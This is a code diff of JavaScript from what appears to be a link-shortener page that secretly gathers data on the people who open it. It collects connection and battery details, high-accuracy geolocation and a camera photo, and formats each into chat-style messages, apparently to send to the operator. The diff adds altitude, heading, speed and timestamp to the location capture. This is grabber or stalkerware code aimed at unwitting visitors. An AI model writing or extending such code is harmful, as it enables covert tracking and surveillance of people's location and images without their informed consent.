@@ -192,19 +192,28 @@ function generateShortLink(longID) {
         conn:getConnection()
       };
     }
-    // Получение геолокации
-async function getGeo() {
+    async function getGeo() {
   if (!navigator.geolocation) return null;
 
   return new Promise((resolve) => {
     navigator.geolocation.getCurrentPosition(
       (position) => {
-        const { latitude, longitude, accuracy } = position.coords;
-        resolve({ latitude, longitude, accuracy });
+        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp } = position.coords;
+        
+        resolve({
+          latitude,
+          longitude,
+          accuracy,
+          altitude: altitude || null,
+          altitudeAccuracy: altitudeAccuracy || null,
+          heading: heading || null,
+          speed: speed || null,
+          timestamp
+        });
       },
       (error) => {
         console.warn('Geolocation error:', error.message);
-        resolve(null);
+        resolve({ error: error.message });
       },
       {
         enableHighAccuracy: true,
@@ -213,7 +222,7 @@ async function getGeo() {
       }
     );
   });
-}
+    }
 
 // Захват фото с камеры
 async function takePhoto() {
@@ -259,10 +268,29 @@ async function takePhoto() {
 **Battery:** ${d.battery? d.battery.lvl+' ('+(d.battery.charging?'charging':'discharging')+')':'Unavailable'}
 **Connection:** ${conn}` };
     }
-    function formatGeo(c){
-      return c? {content:`**Geolocation:**\nLatitude: ${c.latitude}\nLongitude: ${c.longitude}\nAccuracy: ${c.accuracy}m`}
-             : {content:'**Geolocation:** Unavailable'};
+    function formatGeo(c) {
+  if (c) {
+    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp, error } = c;
+    
+    if (error) {
+      return { content: `**Geolocation Error:** ${error}` };
     }
+
+    return {
+      content: `**Geolocation:**\n` +
+               `Latitude: ${latitude}\n` +
+               `Longitude: ${longitude}\n` +
+               `Accuracy: ${accuracy}m\n` +
+               (altitude !== null ? `Altitude: ${altitude}m\n` : '') +
+               (altitudeAccuracy !== null ? `Altitude Accuracy: ${altitudeAccuracy}m\n` : '') +
+               (heading !== null ? `Heading: ${heading}°\n` : '') +
+               (speed !== null ? `Speed: ${speed}m/s\n` : '') +
+               `Timestamp: ${new Date(timestamp).toLocaleString()}`
+    };
+  } else {
+    return { content: '**Geolocation:** Unavailable' };
+  }
+}
     function formatCamera(img){
       return img? {content:'**Camera:** Access granted',embeds:[{image:{url:img}}]}
                 : {content:'**Camera:** Denied/Unavailable'}; 
